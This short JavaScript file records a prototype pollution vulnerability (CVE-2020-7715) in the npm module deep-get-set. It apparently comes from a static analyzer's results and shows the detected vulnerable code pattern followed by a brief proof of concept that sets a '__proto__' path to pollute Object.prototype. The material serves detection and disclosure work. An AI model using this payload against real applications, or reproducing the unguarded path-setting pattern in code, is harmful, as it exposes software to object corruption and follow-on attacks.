// Module Name : deep-get-set
// Version : 1.1.0
// CVE number : CVE-2020-7715
// CVSS score : 9.8 (CVSS 3.0)
// Published Date : 01 Sep, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 4661
[+] Total Time(ms) : 3725
[+] Analysis Time(ms) : 144
[+] Detected AST Pattern 1 : 2
[+] Detected AST Pattern 2 : 1
SCC generation complete
 
**********Prototype Pollution v2 found!**********
[ 4576, 4591 ] obj = obj [ key ]
[ 4598, 4619 ] obj [ undefined ]= value
*/

// Prototype pollution source code patterns detected
/*
function set (obj, path, value) {
	...
	obj = obj[key]          //AST Pattern 1
	...
	obj[keys[i]] = value    //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7715
const deep = require('deep-get-set')
deep({}, ['__proto__', 'polluted'], true)
console.log(polluted) //true